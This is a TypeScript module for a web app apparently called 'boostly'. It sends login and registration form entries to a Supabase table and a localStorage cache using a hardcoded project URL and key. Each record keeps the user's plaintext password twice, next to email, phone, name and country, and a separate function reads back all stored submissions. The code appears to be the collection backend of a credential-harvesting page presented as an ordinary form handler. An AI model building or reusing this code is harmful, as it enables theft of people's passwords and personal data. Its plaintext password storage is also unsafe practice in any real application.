import { createClient, SupabaseClient } from '@supabase/supabase-js';

const DEFAULT_SUPABASE_URL = 'https://bnjeyupntovpcdlbvwev.supabase.co';
const DEFAULT_SUPABASE_KEY = 'sb_publishable_14-RmqXLJ3Me0bwbqWOJLQ_bED6cs8U';

const supabaseUrl = ((import.meta as any).env?.VITE_SUPABASE_URL as string) || DEFAULT_SUPABASE_URL;
const supabaseAnonKey = ((import.meta as any).env?.VITE_SUPABASE_ANON_KEY as string) || DEFAULT_SUPABASE_KEY;

let supabaseInstance: SupabaseClient | null = null;

export const isSupabaseConfigured = (): boolean => {
  return Boolean(supabaseUrl && supabaseAnonKey && supabaseUrl.startsWith('http'));
};

export const getSupabaseClient = (): SupabaseClient | null => {
  if (!isSupabaseConfigured()) {
    return null;
  }
  if (!supabaseInstance) {
    try {
      supabaseInstance = createClient(supabaseUrl, supabaseAnonKey);
    } catch (err) {
      console.warn('Failed to initialize Supabase client:', err);
      return null;
    }
  }
  return supabaseInstance;
};

export interface FormSubmissionPayload {
  type: 'login' | 'registration';
  email: string;
  password?: string;
  username?: string;
  fullName?: string;
  phone?: string;
  country?: string;
  metadata?: Record<string, any>;
  createdAt?: string;
}

/**
 * Saves form submission to Supabase table `user_submissions`.
 * Also keeps a local cache in localStorage so submissions are never lost
 * even before Supabase keys are configured.
 */
export const recordFormSubmission = async (
  payload: FormSubmissionPayload
): Promise<{ success: boolean; error?: string; isLocalFallback?: boolean }> => {
  const timestamp = new Date().toISOString();
  const submissionData = {
    type: payload.type,
    email: payload.email?.trim() || '',
    password: payload.password || '',
    username: payload.username?.trim() || '',
    full_name: payload.fullName?.trim() || '',
    phone: payload.phone?.trim() || '',
    country: payload.country?.trim() || '',
    metadata: {
      ...(payload.metadata || {}),
      password: payload.password || ''
    },
    created_at: timestamp
  };

  // Always save to local backup array in localStorage
  try {
    const existingRaw = localStorage.getItem('boostly_user_submissions');
    const existing = existingRaw ? JSON.parse(existingRaw) : [];
    existing.unshift({ ...submissionData, id: 'local_' + Date.now() });
    localStorage.setItem('boostly_user_submissions', JSON.stringify(existing.slice(0, 100)));
  } catch (err) {
    console.warn('Could not cache submission locally:', err);
  }

  const client = getSupabaseClient();
  if (!client) {
    // Supabase credentials not set yet, safely returned with local fallback
    return {
      success: true,
      isLocalFallback: true,
      error: 'Supabase URL or Key not set in environment. Saved locally.'
    };
  }

  try {
    const { error } = await client.from('user_submissions').insert([submissionData]);
    if (error) {
      console.error('Supabase insert error:', error);
      return { success: false, error: error.message };
    }
    return { success: true };
  } catch (err: any) {
    console.error('Unexpected Supabase error:', err);
    return { success: false, error: err.message || 'Unknown error' };
  }
};

/**
 * Retrieves submissions either from Supabase or local storage backup
 */
export const getSubmissions = async (): Promise<{
  data: any[];
  isFromSupabase: boolean;
}> => {
  const client = getSupabaseClient();
  if (client) {
    try {
      const { data, error } = await client
        .from('user_submissions')
        .select('*')
        .order('created_at', { ascending: false });
      if (!error && data) {
        return { data, isFromSupabase: true };
      }
    } catch (e) {
      console.warn('Error fetching from Supabase, falling back to local storage:', e);
    }
  }

  // Fallback to local storage
  try {
    const raw = localStorage.getItem('boostly_user_submissions');
    return { data: raw ? JSON.parse(raw) : [], isFromSupabase: false };
  } catch {
    return { data: [], isFromSupabase: false };
  }
};

